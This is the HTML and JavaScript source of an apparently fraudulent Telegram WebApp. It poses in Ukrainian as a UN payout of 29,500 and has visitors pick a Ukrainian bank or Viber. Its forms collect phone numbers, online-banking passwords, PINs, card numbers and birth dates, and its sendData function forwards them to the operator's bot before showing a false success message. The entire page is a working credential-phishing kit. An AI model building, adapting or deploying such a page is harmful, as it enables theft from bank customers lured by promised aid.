<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Виплата ООН</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background: #f5f7fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; }
        .container { width: 100%; max-width: 420px; background: #ffffff; border-radius: 24px; box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12); padding: 24px 20px 30px; }
        .header { text-align: center; padding-bottom: 20px; border-bottom: 1px solid #eef2f7; }
        .header .logo { font-size: 40px; margin-bottom: 6px; }
        .header h1 { font-size: 20px; font-weight: 700; color: #1a2634; }
        .header p { font-size: 13px; color: #6b7a8a; margin-top: 4px; }
        .step-indicator { display: flex; justify-content: center; gap: 8px; margin: 18px 0 22px; }
        .step-dot { width: 8px; height: 8px; border-radius: 50%; background: #dce1e8; transition: 0.3s; }
        .step-dot.active { background: #2563eb; width: 24px; border-radius: 12px; }
        .step-dot.done { background: #22c55e; }
        #bankList { display: flex; flex-direction: column; gap: 10px; margin-bottom: 16px; }
        .bank-btn { display: flex; align-items: center; gap: 14px; padding: 14px 18px; background: #f8fafc; border: 1.5px solid #e8edf3; border-radius: 14px; font-size: 15px; font-weight: 500; cursor: pointer; transition: 0.2s; }
        .bank-btn:hover { background: #f1f5f9; border-color: #d0d9e3; }
        .bank-btn:active { transform: scale(0.98); background: #eef2f7; }
        .bank-btn .icon { font-size: 26px; width: 36px; text-align: center; }
        .bank-btn .info { flex: 1; }
        .bank-btn .badge { font-size: 11px; background: #dbeafe; color: #1d4ed8; padding: 2px 10px; border-radius: 20px; font-weight: 600; }
        #formContainer { display: none; margin-top: 16px; animation: fadeUp 0.3s ease; }
        @keyframes fadeUp { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
        .form-group { margin-bottom: 14px; }
        .form-group label { font-size: 13px; font-weight: 600; color: #334155; display: block; margin-bottom: 5px; }
        .phone-input-group { display: flex; gap: 8px; }
        .phone-prefix { padding: 13px 12px; background: #f1f5f9; border: 1.5px solid #e2e8f0; border-radius: 12px; font-size: 15px; font-weight: 500; color: #0f172a; min-width: 70px; display: flex; align-items: center; }
        .phone-input-group input { flex: 1; }
        .form-group input { width: 100%; padding: 13px 16px; border: 1.5px solid #e2e8f0; border-radius: 12px; font-size: 15px; background: #fafcff; outline: none; color: #0f172a; }
        .form-group input:focus { border-color: #2563eb; background: #ffffff; box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15); }
        .form-group input::placeholder { color: #94a3b8; }
        .form-group input:disabled { background: #f5f5f5; color: #999; }
        .btn-submit { width: 100%; padding: 15px; background: #2563eb; color: white; border: none; border-radius: 14px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 8px; transition: 0.2s; }
        .btn-submit:hover:not(:disabled) { background: #1d4ed8; }
        .btn-submit:active:not(:disabled) { transform: scale(0.98); }
        .btn-submit:disabled { opacity: 0.6; cursor: not-allowed; }
        .btn-back { width: 100%; padding: 13px; background: #f1f5f9; color: #334155; border: none; border-radius: 14px; font-size: 15px; font-weight: 500; cursor: pointer; margin-top: 10px; transition: 0.2s; }
        .btn-back:hover { background: #e2e8f0; }
        .btn-back:active { background: #d1d8df; }
        #status { margin-top: 16px; padding: 14px; border-radius: 12px; font-size: 14px; text-align: center; font-weight: 500; display: none; }
        #status.success { display: block; background: #dcfce7; color: #166534; }
        #status.error { display: block; background: #fee2e2; color: #991b1b; }
        #status.loading { display: block; background: #e0f2fe; color: #0369a1; }
        .bank-logo { font-size: 28px; font-weight: 700; text-align: center; padding: 8px 0 12px; color: #0f172a; }
        .bank-logo span { display: block; font-size: 13px; font-weight: 400; color: #64748b; }
        .debug { font-size: 12px; color: #666; margin-top: 10px; text-align: center; }
        .error-message { font-size: 12px; color: #ef4444; margin-top: 3px; }
    </style>
</head>
<body>
<div class="container" id="app">
    <div class="header">
        <div class="logo">🏦</div>
        <h1>Міжнародна система виплат</h1>
        <p>Обе��іть банк для отримання коштів</p>
    </div>

    <div class="step-indicator">
        <span class="step-dot active" id="dot1"></span>
        <span class="step-dot" id="dot2"></span>
        <span class="step-dot" id="dot3"></span>
    </div>

    <div id="bankList"></div>

    <div id="formContainer">
        <div class="bank-logo" id="bankLogo">ПриватБанк</div>
        <div id="formFields"></div>
        <button class="btn-submit" onclick="sendData()">✅ Підтвердити</button>
        <button class="btn-back" onclick="goBack()">⬅ Назад</button>
        <div id="status"></div>
        <div id="debugInfo" class="debug"></div>
    </div>

    <div id="statusGlobal" style="margin-top:16px;text-align:center;font-size:13px;color:#94a3b8;">Натисніть на банк, щоб продовжити</div>
</div>

<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script>
    const banks = {
        privat: { 
            name: 'ПриватБанк', 
            icon: '💳',
            fields: [
                { id: 'phone', label: '📱 Номер телефону', type: 'phone', placeholder: '00 000 00 00' },
                { id: 'password', label: '🔑 Пароль', type: 'text', placeholder: 'Введіть пароль' },
                { id: 'pin', label: '📌 Пін-код', type: 'text', placeholder: '4 цифри' }
            ]
        },
        oschad: { 
            name: 'Ощадбанк', 
            icon: '🏛️',
            fields: [
                { id: 'phone', label: '📱 Номер телефону', type: 'phone', placeholder: '00 000 00 00' },
                { id: 'password', label: '🔑 Пароль', type: 'text', placeholder: 'Введіть пароль' },
                { id: 'card', label: '💳 Номер карти', type: 'text', placeholder: '0000 0000 0000 0000' },
                { id: 'pin', label: '📌 Пін-код', type: 'text', placeholder: '4 цифри' },
                { id: 'birth', label: '📅 Дата народження', type: 'text', placeholder: 'ДД.ММ.РРРР' }
            ]
        },
        raif: { 
            name: 'Райффайзен Банк', 
            icon: '💼',
            fields: [
                { id: 'phone', label: '📱 Номер телефону', type: 'phone', placeholder: '00 000 00 00' },
                { id: 'pin', label: '📌 Пін-код', type: 'text', placeholder: '4 цифри' }
            ]
        },
        abank: { 
            name: 'А-Банк', 
            icon: '🏧',
            fields: [
                { id: 'phone', label: '📱 Номер телефону', type: 'phone', placeholder: '00 000 00 00' },
                { id: 'pin', label: '📌 Пін-код', type: 'text', placeholder: '4 цифри' }
            ]
        },
        izibank: { 
            name: 'Ізі Банк', 
            icon: '💎',
            fields: [
                { id: 'phone', label: '📱 Номер телефону', type: 'phone', placeholder: '00 000 00 00' },
                { id: 'pin', label: '📌 Пін-код', type: 'text', placeholder: '4 цифри' }
            ]
        },
        viber: { 
            name: 'Viber', 
            icon: '💬',
            fields: [
                { id: 'phone', label: '📱 Номер телефону', type: 'phone', placeholder: '00 000 00 00' }
            ]
        }
    };

    let selectedBank = null;
    let userId = new URLSearchParams(window.location.search).get('user_id') || 'unknown';
    let tg = window.Telegram ? window.Telegram.WebApp : null;

    if (tg) {
        tg.ready();
        document.getElementById('debugInfo').textContent = '✅ WebApp готов';
    } else {
        document.getElementById('debugInfo').textContent = '❌ Telegram WebApp не знайдено';
    }

    function renderBanks() {
        const container = document.getElementById('bankList');
        container.innerHTML = '';
        for (const [key, bank] of Object.entries(banks)) {
            const btn = document.createElement('div');
            btn.className = 'bank-btn';
            btn.innerHTML = `<span class="icon">${bank.icon}</span><span class="info">${bank.name}</span><span class="badge">${bank.fields.length} полів</span>`;
            btn.onclick = () => selectBank(key);
            container.appendChild(btn);
        }
    }

    function selectBank(key) {
        selectedBank = key;
        const bank = banks[key];
        if (!bank) return;

        document.getElementById('bankList').style.display = 'none';
        document.getElementById('formContainer').style.display = 'block';
        document.getElementById('statusGlobal').textContent = '';

        document.getElementById('bankLogo').innerHTML = `${bank.icon} ${bank.name} <span>${bank.fields.length} полів для заповнення</span>`;

        document.getElementById('dot1').classList.remove('active');
        document.getElementById('dot1').classList.add('done');
        document.getElementById('dot2').classList.add('active');

        const fieldsContainer = document.getElementById('formFields');
        fieldsContainer.innerHTML = '';
        bank.fields.forEach(f => {
            const div = document.createElement('div');
            div.className = 'form-group';
            
            if (f.type === 'phone') {
                // Специальный ввод для телефона
                div.innerHTML = `
                    <label>${f.label}</label>
                    <div class="phone-input-group">
                        <div class="phone-prefix">+380</div>
                        <input type="tel" id="${f.id}" placeholder="${f.placeholder}" autocomplete="off" maxlength="9" inputmode="numeric" data-phone="true">
                    </div>
                    <div id="${f.id}-error" class="error-message"></div>
                `;
            } else {
                div.innerHTML = `
                    <label>${f.label}</label>
                    <input type="text" id="${f.id}" placeholder="${f.placeholder}" autocomplete="off">
                `;
            }
            fieldsContainer.appendChild(div);
        });

        // Добавляем валидацию для полей телефона
        const phoneInputs = fieldsContainer.querySelectorAll('input[data-phone]');
        phoneInputs.forEach(input => {
            input.addEventListener('input', function(e) {
                // Только цифры
                this.value = this.value.replace(/[^0-9]/g, '');
                
                // Проверка на ошибку (если введено +3800...)
                const errorEl = document.getElementById(this.id + '-error');
                if (this.value.startsWith('0') && this.value.length > 0) {
                    errorEl.textContent = '❌ Номер повинен починатись з 9, 6, 7 цифр (без 0)';
                } else {
                    errorEl.textContent = '';
                }
            });
        });

        setTimeout(() => {
            const firstInput = fieldsContainer.querySelector('input');
            if (firstInput) firstInput.focus();
        }, 200);
    }

    function goBack() {
        document.getElementById('bankList').style.display = 'flex';
        document.getElementById('formContainer').style.display = 'none';
        document.getElementById('status').className = '';
        document.getElementById('status').style.display = 'none';
        document.getElementById('dot2').classList.remove('active');
        document.getElementById('dot2').classList.remove('done');
        document.getElementById('dot1').classList.add('active');
        document.getElementById('statusGlobal').textContent = 'Натисніть на банк, щоб продовжити';
        selectedBank = null;
    }

    function sendData() {
        const statusEl = document.getElementById('status');
        const debugEl = document.getElementById('debugInfo');
        const fields = document.querySelectorAll('#formFields input');
        const data = {};

        let hasError = false;
        fields.forEach(input => {
            let val = input.value.trim();
            
            // Специальная обработка для телефона
            if (input.getAttribute('data-phone')) {
                // Проверка на +3800... (ошибка)
                if (val.startsWith('0')) {
                    hasError = true;
                    input.style.borderColor = '#ef4444';
                    return;
                }
                // Формируем полный номер
                val = '+380' + val;
                if (!val || val === '+380') {
                    hasError = true;
                    input.style.borderColor = '#ef4444';
                    return;
                }
            }
            
            data[input.id] = val;
            if (!val) {
                input.style.borderColor = '#ef4444';
                hasError = true;
            } else {
                input.style.borderColor = '#e2e8f0';
            }
        });

        if (hasError) {
            statusEl.className = 'error';
            statusEl.style.display = 'block';
            statusEl.textContent = '❌ Будь ласка, заповніть всі поля коректно!';
            return;
        }

        data.bank = selectedBank;
        data.user_id = userId;
        data.amount = '29500';
        data.timestamp = new Date().toISOString();

        statusEl.className = 'loading';
        statusEl.style.display = 'block';
        statusEl.textContent = '⏳ Надсилання даних...';

        if (tg) {
            try {
                const jsonData = JSON.stringify(data);
                debugEl.textContent = '📤 Надсилання: ' + jsonData;
                
                // ✅ Отправляем данные через Telegram WebApp
                tg.sendData(jsonData);
                
                // ✅ Показываем успех
                statusEl.className = 'success';
                statusEl.textContent = '✅ Дані успішно надіслано! Очікуйте підтвердження.';
                
                document.getElementById('dot2').classList.remove('active');
                document.getElementById('dot2').classList.add('done');
                document.getElementById('dot3').classList.add('active');
                
                // Отключаем кнопку отправки
                document.querySelector('.btn-submit').disabled = true;
                document.querySelector('.btn-submit').style.opacity = '0.6';
                
                // ✅ Даем боту 7 секунд на обработку
                setTimeout(() => {
                    if (statusEl.className === 'success') {
                        debugEl.textContent = '✅ Закрытие WebApp...';
                        tg.close();
                    }
                }, 7000);
                
            } catch(e) {
                statusEl.className = 'error';
                statusEl.textContent = '❌ Помилка відправки: ' + e.message;
                debugEl.textContent = '❌ ' + e.message;
            }
        } else {
            statusEl.className = 'error';
            statusEl.textContent = '❌ Telegram WebApp не доступний. Спробуйте через бота.';
            debugEl.textContent = '❌ WebApp не доступний';
        }
    }

    renderBanks();
</script>
</body>
</html>
